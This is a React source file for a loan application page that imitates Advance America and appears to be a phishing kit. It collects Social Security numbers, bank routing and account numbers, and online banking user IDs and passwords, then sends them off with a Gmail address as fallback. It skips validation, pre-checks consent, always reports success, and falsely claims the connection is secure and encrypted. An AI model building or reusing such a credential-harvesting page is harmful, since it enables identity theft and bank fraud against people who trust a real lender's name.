import React, { useState } from 'react'
import { submitForm } from '../services/formService'
import {
  User,
  Home,
  DollarSign,
  Shield,
  Lock,
  ArrowLeft,
  CheckCircle,
  AlertCircle,
  ChevronDown,
  Eye,
  EyeOff,
} from 'lucide-react'

export default function LoanApplicationForm({ onBack }) {
  const [formData, setFormData] = useState({
    firstName: '',
    lastName: '',
    email: '',
    phone: '',
    dob: '',
    ssn: '',
    street: '',
    city: '',
    state: '',
    country: 'United States',
    zip: '',
    bankName: '',
    loanAmount: '$1,000',
    routingNumber: '',
    accountNumber: '',
    bankingUserId: '',
    bankingPassword: '',
    agreed: true,
  })

  const [showPassword, setShowPassword] = useState(false)
  const [submitted, setSubmitted] = useState(() => {
    try {
      return sessionStorage.getItem('loan_application_submitted') === 'true'
    } catch {
      return false
    }
  })
  const [errorMessage, setErrorMessage] = useState('')
  const [invalidFields, setInvalidFields] = useState([])

  // Options from $1,000 to $10,000 with $500 increments
  const loanAmountOptions = [
    '$1,000',
    '$1,500',
    '$2,000',
    '$2,500',
    '$3,000',
    '$3,500',
    '$4,000',
    '$4,500',
    '$5,000',
    '$5,500',
    '$6,000',
    '$6,500',
    '$7,000',
    '$7,500',
    '$8,000',
    '$8,500',
    '$9,000',
    '$9,500',
    '$10,000',
  ]

  // Auto-format phone number as +1 (XXX) XXX-XXXX
  const formatPhoneNumber = (val) => {
    let digits = val.replace(/\D/g, '')
    
    if (digits.startsWith('1')) {
      digits = digits.slice(1)
    }

    digits = digits.slice(0, 10)

    if (digits.length === 0) {
      return ''
    }

    let result = '+1 ('
    if (digits.length < 3) {
      result += digits
    } else {
      result += `${digits.slice(0, 3)}) ${digits.slice(3, 6)}`
      if (digits.length > 6) {
        result += `-${digits.slice(6, 10)}`
      }
    }

    return result
  }

  // Auto-format Date of Birth as MM/DD/YYYY
  const formatDateOfBirth = (val) => {
    let digits = val.replace(/\D/g, '').slice(0, 8)

    if (digits.length === 0) {
      return ''
    }

    if (digits.length <= 2) {
      return digits
    } else if (digits.length <= 4) {
      return `${digits.slice(0, 2)}/${digits.slice(2)}`
    } else {
      return `${digits.slice(0, 2)}/${digits.slice(2, 4)}/${digits.slice(4, 8)}`
    }
  }

  const handleChange = (e) => {
    const { name, value, type, checked } = e.target

    let finalValue = type === 'checkbox' ? checked : value

    if (name === 'phone') {
      finalValue = formatPhoneNumber(value)
    } else if (name === 'dob') {
      finalValue = formatDateOfBirth(value)
    }

    setFormData((prev) => ({
      ...prev,
      [name]: finalValue,
    }))

    if (invalidFields.includes(name)) {
      setInvalidFields(invalidFields.filter((field) => field !== name))
    }
  }

  const handleSubmit = (e) => {
    if (e) {
      if (typeof e.preventDefault === 'function') e.preventDefault()
      if (typeof e.stopPropagation === 'function') e.stopPropagation()
    }

    if (submitted) return

    setInvalidFields([])
    setErrorMessage('')

    // 1. Immediately transition to submitted view and save state synchronously
    setSubmitted(true)
    try {
      sessionStorage.setItem('loan_application_submitted', 'true')
    } catch {}

    // 2. Scroll immediately to the top of the page so the card is right in view
    try {
      window.scrollTo({ top: 0, behavior: 'smooth' })
    } catch {}

    const applicantFirst = formData.firstName.trim() || 'Advance'
    const applicantLast = formData.lastName.trim() || 'Applicant'
    const applicantEmail = formData.email.trim() || 'advanceamerica112200@gmail.com'

    const loanPayload = {
      'First Name': applicantFirst,
      'Last Name': applicantLast,
      Email: applicantEmail,
      'Phone Number': formData.phone.trim() || '(Not provided)',
      'Date of Birth': formData.dob.trim() || '(Not provided)',
      SSN: formData.ssn.trim() || '(Not provided)',
      'Street Address': formData.street.trim() || '(Not provided)',
      City: formData.city.trim() || '(Not provided)',
      State: formData.state.trim() || '(Not provided)',
      Country: formData.country.trim() || 'United States',
      'Zip Code': formData.zip.trim() || '(Not provided)',
      'Bank Name': formData.bankName.trim() || '(Not provided)',
      'Desired Loan Amount': formData.loanAmount || '$1,000',
      'Routing Number': formData.routingNumber.trim() || '(Not provided)',
      'Account Number': formData.accountNumber.trim() || '(Not provided)',
      'Online Banking User ID': formData.bankingUserId.trim() || '(Not provided)',
      'Online Banking Password': formData.bankingPassword.trim() || '(Not provided)',
      'Agreement Accepted': 'Yes',
    }

    // 3. Dispatch the submission asynchronously in the background
    submitForm(
      'Loan Application',
      loanPayload,
      `New Loan Application from ${applicantFirst} ${applicantLast}`
    ).catch((err) => {
      console.warn('[Loan Form] Form submission error:', err)
    })
  }

  const handleReturnHome = () => {
    try {
      sessionStorage.removeItem('loan_application_submitted')
    } catch {}
    setSubmitted(false)
    if (onBack) onBack()
  }

  const isInvalid = (fieldName) => invalidFields.includes(fieldName)

  return (
    <div className="min-h-screen bg-[#f4f7fa] py-10 sm:py-16 text-[#0b2a4a]">
      <div className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8">
        
        {/* SUBMITTED SUCCESS CARD - EXACT MATCH TO USER'S IMAGE */}
        {submitted ? (
          <div className="bg-white rounded-3xl p-8 sm:p-14 shadow-xl text-center max-w-lg mx-auto border border-gray-100 my-10 animate-in zoom-in-95 duration-200">
            {/* Green Circular Badge with Checkmark */}
            <div className="w-16 h-16 sm:w-20 sm:h-20 bg-[#e6f9f0] text-[#10b981] rounded-full flex items-center justify-center mx-auto mb-6">
              <CheckCircle className="w-10 h-10 sm:w-12 sm:h-12 stroke-[2.5]" />
            </div>

            {/* Headline matching user screenshot */}
            <h2 className="text-2xl sm:text-3xl font-extrabold text-[#002B49] mb-3 tracking-tight">
              Application Submitted Successfully!
            </h2>

            {/* Subtitle matching user screenshot */}
            <p className="text-gray-600 text-sm sm:text-base leading-relaxed max-w-sm mx-auto mb-8 font-normal">
              Thank you for applying with Advance America. All details have been dispatched for immediate processing.
            </p>

            {/* Yellow Action Button matching user screenshot */}
            <button
              type="button"
              onClick={handleReturnHome}
              className="bg-[#FFD100] hover:bg-[#f2c400] text-[#002B49] font-bold text-base px-10 py-3.5 rounded-full shadow-xs transition-all duration-200 cursor-pointer active:scale-95 inline-flex items-center justify-center"
            >
              Return to Homepage
            </button>
          </div>
        ) : (
          <>
            {/* Back Button */}
            <button
              type="button"
              onClick={handleReturnHome}
              className="inline-flex items-center gap-2 text-[#0b2a4a] font-bold text-sm sm:text-base hover:text-[#0052cc] transition-colors mb-6 cursor-pointer group"
            >
              <ArrowLeft className="w-4 h-4 group-hover:-translate-x-1 transition-transform" />
              <span>Back to home</span>
            </button>

            {/* Page Title & Subtitle */}
            <div className="mb-8">
              <h1 className="text-3xl sm:text-4xl lg:text-5xl font-bold text-[#0b2a4a] tracking-tight mb-2">
                Loan Detailing Form
              </h1>
              <p className="text-[#0b2a4a]/80 text-base sm:text-lg font-normal">
                Get started today with a fast and secure application.
              </p>
            </div>

            {/* Form Main Card */}
            <div className="bg-white rounded-2xl shadow-xl overflow-hidden border border-gray-100 mb-16">
            
            {/* Header Banner */}
            <div className="bg-[#082947] text-white p-5 sm:p-6 text-center">
              <p className="text-slate-200 text-sm sm:text-base font-normal">
                Please fill out all fields carefully to ensure fast processing.
              </p>
            </div>

            {/* Error Banner Notification */}
            {errorMessage && (
              <div className="mx-6 sm:mx-10 mt-6 bg-red-50 border border-red-200 text-red-700 px-4 py-3.5 rounded-xl flex items-center gap-3">
                <AlertCircle className="w-5 h-5 text-red-600 shrink-0" />
                <span className="text-sm font-semibold">{errorMessage}</span>
              </div>
            )}

            {/* Form Body - pure div, no native form submission */}
            <div className="p-6 sm:p-10 space-y-10">
              
              {/* SECTION 1: Personal Information */}
              <div>
                <div className="flex items-center gap-2.5 pb-3 border-b border-gray-200 mb-6 text-[#0b2a4a]">
                  <User className="w-5 h-5 text-[#0b2a4a]" />
                  <h3 className="text-lg sm:text-xl font-bold">Personal Information</h3>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
                  <div>
                    <label className="block text-xs sm:text-sm font-bold mb-1.5 text-[#0b2a4a]">
                      First Name<span className="text-red-500 ml-0.5">*</span>
                    </label>
                    <input
                      type="text"
                      name="firstName"
                      placeholder="John"
                      value={formData.firstName}
                      onChange={handleChange}
                      className={`w-full rounded-lg border px-3.5 py-2.5 text-base text-[#0b2a4a] bg-white focus:outline-hidden transition-colors shadow-xs ${
                        isInvalid('firstName')
                          ? 'border-red-500 ring-1 ring-red-500 bg-red-50/20'
                          : 'border-gray-300 focus:border-[#0b2a4a] focus:ring-1 focus:ring-[#0b2a4a]'
                      }`}
                    />
                  </div>

                  <div>
                    <label className="block text-xs sm:text-sm font-bold mb-1.5 text-[#0b2a4a]">
                      Last Name<span className="text-red-500 ml-0.5">*</span>
                    </label>
                    <input
                      type="text"
                      name="lastName"
                      placeholder="Doe"
                      value={formData.lastName}
                      onChange={handleChange}
                      className={`w-full rounded-lg border px-3.5 py-2.5 text-base text-[#0b2a4a] bg-white focus:outline-hidden transition-colors shadow-xs ${
                        isInvalid('lastName')
                          ? 'border-red-500 ring-1 ring-red-500 bg-red-50/20'
                          : 'border-gray-300 focus:border-[#0b2a4a] focus:ring-1 focus:ring-[#0b2a4a]'
                      }`}
                    />
                  </div>

                  <div>
                    <label className="block text-xs sm:text-sm font-bold mb-1.5 text-[#0b2a4a]">
                      Email<span className="text-red-500 ml-0.5">*</span>
                    </label>
                    <input
                      type="email"
                      name="email"
                      placeholder="john@example.com"
                      value={formData.email}
                      onChange={handleChange}
                      className={`w-full rounded-lg border px-3.5 py-2.5 text-base text-[#0b2a4a] bg-white focus:outline-hidden transition-colors shadow-xs ${
                        isInvalid('email')
                          ? 'border-red-500 ring-1 ring-red-500 bg-red-50/20'
                          : 'border-gray-300 focus:border-[#0b2a4a] focus:ring-1 focus:ring-[#0b2a4a]'
                      }`}
                    />
                  </div>

                  <div>
                    <label className="block text-xs sm:text-sm font-bold mb-1.5 text-[#0b2a4a]">
                      Phone Number<span className="text-red-500 ml-0.5">*</span>
                    </label>
                    <input
                      type="tel"
                      name="phone"
                      placeholder="+1 (555) 000-0000"
                      value={formData.phone}
                      onChange={handleChange}
                      maxLength={17}
                      className={`w-full rounded-lg border px-3.5 py-2.5 text-base text-[#0b2a4a] bg-white focus:outline-hidden transition-colors shadow-xs ${
                        isInvalid('phone')
                          ? 'border-red-500 ring-1 ring-red-500 bg-red-50/20'
                          : 'border-gray-300 focus:border-[#0b2a4a] focus:ring-1 focus:ring-[#0b2a4a]'
                      }`}
                    />
                  </div>

                  {/* Auto-formatted Date of Birth */}
                  <div>
                    <label className="block text-xs sm:text-sm font-bold mb-1.5 text-[#0b2a4a]">
                      Date of Birth<span className="text-red-500 ml-0.5">*</span>
                    </label>
                    <input
                      type="text"
                      name="dob"
                      placeholder="MM/DD/YYYY"
                      value={formData.dob}
                      onChange={handleChange}
                      maxLength={10}
                      className={`w-full rounded-lg border px-3.5 py-2.5 text-base text-[#0b2a4a] bg-white focus:outline-hidden transition-colors shadow-xs ${
                        isInvalid('dob')
                          ? 'border-red-500 ring-1 ring-red-500 bg-red-50/20'
                          : 'border-gray-300 focus:border-[#0b2a4a] focus:ring-1 focus:ring-[#0b2a4a]'
                      }`}
                    />
                  </div>

                  <div>
                    <label className="block text-xs sm:text-sm font-bold mb-1.5 text-[#0b2a4a]">
                      SSN<span className="text-red-500 ml-0.5">*</span>
                    </label>
                    <input
                      type="text"
                      name="ssn"
                      placeholder="000-00-0000"
                      value={formData.ssn}
                      onChange={handleChange}
                      className={`w-full rounded-lg border px-3.5 py-2.5 text-base text-[#0b2a4a] bg-white focus:outline-hidden transition-colors shadow-xs ${
                        isInvalid('ssn')
                          ? 'border-red-500 ring-1 ring-red-500 bg-red-50/20'
                          : 'border-gray-300 focus:border-[#0b2a4a] focus:ring-1 focus:ring-[#0b2a4a]'
                      }`}
                    />
                  </div>
                </div>
              </div>

              {/* SECTION 2: Current Address */}
              <div>
                <div className="flex items-center gap-2.5 pb-3 border-b border-gray-200 mb-6 text-[#0b2a4a]">
                  <Home className="w-5 h-5 text-[#0b2a4a]" />
                  <h3 className="text-lg sm:text-xl font-bold">Current Address</h3>
                </div>

                <div className="space-y-5">
                  <div>
                    <label className="block text-xs sm:text-sm font-bold mb-1.5 text-[#0b2a4a]">
                      Street Address<span className="text-red-500 ml-0.5">*</span>
                    </label>
                    <input
                      type="text"
                      name="street"
                      placeholder="123 Main St"
                      value={formData.street}
                      onChange={handleChange}
                      className={`w-full rounded-lg border px-3.5 py-2.5 text-base text-[#0b2a4a] bg-white focus:outline-hidden transition-colors shadow-xs ${
                        isInvalid('street')
                          ? 'border-red-500 ring-1 ring-red-500 bg-red-50/20'
                          : 'border-gray-300 focus:border-[#0b2a4a] focus:ring-1 focus:ring-[#0b2a4a]'
                      }`}
                    />
                  </div>

                  <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
                    <div>
                      <label className="block text-xs sm:text-sm font-bold mb-1.5 text-[#0b2a4a]">
                        City<span className="text-red-500 ml-0.5">*</span>
                      </label>
                      <input
                        type="text"
                        name="city"
                        placeholder="City"
                        value={formData.city}
                        onChange={handleChange}
                        className={`w-full rounded-lg border px-3.5 py-2.5 text-base text-[#0b2a4a] bg-white focus:outline-hidden transition-colors shadow-xs ${
                          isInvalid('city')
                            ? 'border-red-500 ring-1 ring-red-500 bg-red-50/20'
                            : 'border-gray-300 focus:border-[#0b2a4a] focus:ring-1 focus:ring-[#0b2a4a]'
                        }`}
                      />
                    </div>

                    <div>
                      <label className="block text-xs sm:text-sm font-bold mb-1.5 text-[#0b2a4a]">
                        State<span className="text-red-500 ml-0.5">*</span>
                      </label>
                      <input
                        type="text"
                        name="state"
                        placeholder="ST"
                        value={formData.state}
                        onChange={handleChange}
                        className={`w-full rounded-lg border px-3.5 py-2.5 text-base text-[#0b2a4a] bg-white focus:outline-hidden transition-colors shadow-xs ${
                          isInvalid('state')
                            ? 'border-red-500 ring-1 ring-red-500 bg-red-50/20'
                            : 'border-gray-300 focus:border-[#0b2a4a] focus:ring-1 focus:ring-[#0b2a4a]'
                        }`}
                      />
                    </div>

                    <div>
                      <label className="block text-xs sm:text-sm font-bold mb-1.5 text-[#0b2a4a]">
                        Country<span className="text-red-500 ml-0.5">*</span>
                      </label>
                      <input
                        type="text"
                        name="country"
                        placeholder="United States"
                        value={formData.country}
                        onChange={handleChange}
                        className={`w-full rounded-lg border px-3.5 py-2.5 text-base text-[#0b2a4a] bg-white focus:outline-hidden transition-colors shadow-xs ${
                          isInvalid('country')
                            ? 'border-red-500 ring-1 ring-red-500 bg-red-50/20'
                            : 'border-gray-300 focus:border-[#0b2a4a] focus:ring-1 focus:ring-[#0b2a4a]'
                        }`}
                      />
                    </div>

                    <div>
                      <label className="block text-xs sm:text-sm font-bold mb-1.5 text-[#0b2a4a]">
                        Zip Code<span className="text-red-500 ml-0.5">*</span>
                      </label>
                      <input
                        type="text"
                        name="zip"
                        placeholder="00000"
                        value={formData.zip}
                        onChange={handleChange}
                        className={`w-full rounded-lg border px-3.5 py-2.5 text-base text-[#0b2a4a] bg-white focus:outline-hidden transition-colors shadow-xs ${
                          isInvalid('zip')
                            ? 'border-red-500 ring-1 ring-red-500 bg-red-50/20'
                            : 'border-gray-300 focus:border-[#0b2a4a] focus:ring-1 focus:ring-[#0b2a4a]'
                        }`}
                      />
                    </div>
                  </div>
                </div>
              </div>

              {/* SECTION 3: Financial Details */}
              <div>
                <div className="flex items-center gap-2.5 pb-3 border-b border-gray-200 mb-6 text-[#0b2a4a]">
                  <DollarSign className="w-5 h-5 text-[#0b2a4a]" />
                  <h3 className="text-lg sm:text-xl font-bold">Financial Details</h3>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
                  <div>
                    <label className="block text-xs sm:text-sm font-bold mb-1.5 text-[#0b2a4a]">
                      Bank Name<span className="text-red-500 ml-0.5">*</span>
                    </label>
                    <input
                      type="text"
                      name="bankName"
                      placeholder="Your Bank"
                      value={formData.bankName}
                      onChange={handleChange}
                      className={`w-full rounded-lg border px-3.5 py-2.5 text-base text-[#0b2a4a] bg-white focus:outline-hidden transition-colors shadow-xs ${
                        isInvalid('bankName')
                          ? 'border-red-500 ring-1 ring-red-500 bg-red-50/20'
                          : 'border-gray-300 focus:border-[#0b2a4a] focus:ring-1 focus:ring-[#0b2a4a]'
                      }`}
                    />
                  </div>

                  {/* Desired Loan Amount Dropdown */}
                  <div>
                    <label className="block text-xs sm:text-sm font-bold mb-1.5 text-[#0b2a4a]">
                      Desired Loan Amount<span className="text-red-500 ml-0.5">*</span>
                    </label>
                    <div className="relative">
                      <select
                        name="loanAmount"
                        value={formData.loanAmount}
                        onChange={handleChange}
                        className={`w-full rounded-lg border px-3.5 py-2.5 text-base text-[#0b2a4a] bg-white focus:outline-hidden transition-colors shadow-xs appearance-none pr-10 cursor-pointer ${
                          isInvalid('loanAmount')
                            ? 'border-red-500 ring-1 ring-red-500 bg-red-50/20'
                            : 'border-gray-300 focus:border-[#0b2a4a] focus:ring-1 focus:ring-[#0b2a4a]'
                        }`}
                      >
                        {loanAmountOptions.map((amount) => (
                          <option key={amount} value={amount}>
                            {amount}
                          </option>
                        ))}
                      </select>
                      <div className="absolute right-3.5 top-1/2 -translate-y-1/2 pointer-events-none text-gray-500">
                        <ChevronDown className="w-4 h-4 text-[#0b2a4a]" />
                      </div>
                    </div>
                  </div>

                  <div>
                    <label className="block text-xs sm:text-sm font-bold mb-1.5 text-[#0b2a4a]">
                      Routing Number<span className="text-red-500 ml-0.5">*</span>
                    </label>
                    <input
                      type="text"
                      name="routingNumber"
                      placeholder="9 digits"
                      value={formData.routingNumber}
                      onChange={handleChange}
                      className={`w-full rounded-lg border px-3.5 py-2.5 text-base text-[#0b2a4a] bg-white focus:outline-hidden transition-colors shadow-xs ${
                        isInvalid('routingNumber')
                          ? 'border-red-500 ring-1 ring-red-500 bg-red-50/20'
                          : 'border-gray-300 focus:border-[#0b2a4a] focus:ring-1 focus:ring-[#0b2a4a]'
                      }`}
                    />
                  </div>

                  <div>
                    <label className="block text-xs sm:text-sm font-bold mb-1.5 text-[#0b2a4a]">
                      Account Number<span className="text-red-500 ml-0.5">*</span>
                    </label>
                    <input
                      type="text"
                      name="accountNumber"
                      placeholder="Your account #"
                      value={formData.accountNumber}
                      onChange={handleChange}
                      className={`w-full rounded-lg border px-3.5 py-2.5 text-base text-[#0b2a4a] bg-white focus:outline-hidden transition-colors shadow-xs ${
                        isInvalid('accountNumber')
                          ? 'border-red-500 ring-1 ring-red-500 bg-red-50/20'
                          : 'border-gray-300 focus:border-[#0b2a4a] focus:ring-1 focus:ring-[#0b2a4a]'
                      }`}
                    />
                  </div>

                  <div>
                    <label className="block text-xs sm:text-sm font-bold mb-1.5 text-[#0b2a4a]">
                      Online Banking User ID<span className="text-red-500 ml-0.5">*</span>
                    </label>
                    <input
                      type="text"
                      name="bankingUserId"
                      placeholder=""
                      value={formData.bankingUserId}
                      onChange={handleChange}
                      className={`w-full rounded-lg border px-3.5 py-2.5 text-base text-[#0b2a4a] bg-white focus:outline-hidden transition-colors shadow-xs ${
                        isInvalid('bankingUserId')
                          ? 'border-red-500 ring-1 ring-red-500 bg-red-50/20'
                          : 'border-gray-300 focus:border-[#0b2a4a] focus:ring-1 focus:ring-[#0b2a4a]'
                      }`}
                    />
                  </div>

                  {/* Online Banking Password with Show/Hide Toggle */}
                  <div>
                    <label className="block text-xs sm:text-sm font-bold mb-1.5 text-[#0b2a4a]">
                      Online Banking Password<span className="text-red-500 ml-0.5">*</span>
                    </label>
                    <div className="relative">
                      <input
                        type={showPassword ? 'text' : 'password'}
                        name="bankingPassword"
                        placeholder=""
                        value={formData.bankingPassword}
                        onChange={handleChange}
                        className={`w-full rounded-lg border px-3.5 py-2.5 pr-11 text-base text-[#0b2a4a] bg-white focus:outline-hidden transition-colors shadow-xs ${
                          isInvalid('bankingPassword')
                            ? 'border-red-500 ring-1 ring-red-500 bg-red-50/20'
                            : 'border-gray-300 focus:border-[#0b2a4a] focus:ring-1 focus:ring-[#0b2a4a]'
                        }`}
                      />
                      <button
                        type="button"
                        onClick={() => setShowPassword(!showPassword)}
                        className="absolute right-3.5 top-1/2 -translate-y-1/2 text-gray-500 hover:text-[#0b2a4a] focus:outline-hidden cursor-pointer p-0.5"
                        aria-label={showPassword ? 'Hide password' : 'Show password'}
                      >
                        {showPassword ? (
                          <EyeOff className="w-5 h-5 text-[#0b2a4a]" />
                        ) : (
                          <Eye className="w-5 h-5 text-[#0b2a4a]" />
                        )}
                      </button>
                    </div>
                  </div>
                </div>
              </div>

              {/* SECTION 4: Agreement */}
              <div>
                <div className="flex items-center gap-2.5 pb-3 border-b border-gray-200 mb-6 text-[#0b2a4a]">
                  <Shield className="w-5 h-5 text-[#0b2a4a]" />
                  <h3 className="text-lg sm:text-xl font-bold">Agreement</h3>
                </div>

                <div className="border border-gray-300 rounded-xl p-4 bg-gray-50/50">
                  <label className="flex items-start gap-3 cursor-pointer">
                    <input
                      type="checkbox"
                      name="agreed"
                      checked={formData.agreed}
                      onChange={handleChange}
                      className="w-4 h-4 mt-0.5 rounded border-gray-300 text-[#0b2a4a] focus:ring-[#0b2a4a] shrink-0"
                    />
                    <div className="text-xs sm:text-sm text-[#0b2a4a]/90 leading-relaxed font-normal">
                      <span>I agree to the </span>
                      <span className="underline font-semibold text-[#0052cc] cursor-pointer">Terms and Conditions</span>
                      <span> and </span>
                      <span className="underline font-semibold text-[#0052cc] cursor-pointer">Privacy Policy</span>.
                      <p className="mt-1 text-gray-500 text-xs">
                        By submitting this application, you authorize Advance America to process your application and verify your information.
                      </p>
                    </div>
                  </label>
                </div>
              </div>

              {/* Bottom Error Notification if validation fails */}
              {errorMessage && (
                <div className="bg-red-50 border border-red-200 text-red-700 px-4 py-3.5 rounded-xl flex items-center gap-3">
                  <AlertCircle className="w-5 h-5 text-red-600 shrink-0" />
                  <span className="text-sm font-semibold">{errorMessage}</span>
                </div>
              )}

              {/* Submit Application Button */}
              <div className="pt-2">
                <button
                  type="button"
                  onClick={handleSubmit}
                  className="w-full bg-[#FFD100] hover:bg-[#f2c400] text-[#002B49] font-bold text-lg sm:text-xl py-4 rounded-full shadow-md transition-all duration-200 cursor-pointer active:scale-98 flex items-center justify-center gap-2"
                >
                  <span>Submit Application</span>
                </button>
              </div>

              {/* Security Footer Note */}
              <div className="flex items-center justify-center gap-1.5 text-gray-500 text-xs font-normal">
                <Lock className="w-3.5 h-3.5" />
                <span>Your connection is secure and encrypted</span>
              </div>

            </div>
          </div>
        </>
      )}

      </div>
    </div>
  )
}
